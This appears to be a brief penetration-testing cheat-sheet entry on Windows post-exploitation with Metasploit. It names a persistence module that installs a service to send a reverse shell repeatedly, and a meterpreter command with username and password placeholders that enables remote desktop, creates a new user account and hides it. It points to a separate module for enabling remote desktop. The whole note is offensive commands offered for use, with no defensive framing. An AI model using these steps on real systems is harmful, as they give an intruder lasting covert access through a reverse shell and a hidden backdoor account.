```
exploit/windows/local/persistence_service

create a service that send the reverse shell always

On meterpreter
run getgui -e -u USER -p PASS -> enable rdp and create a user, also hide the user
[!] Better use post/windows/manage/enable_rdp
```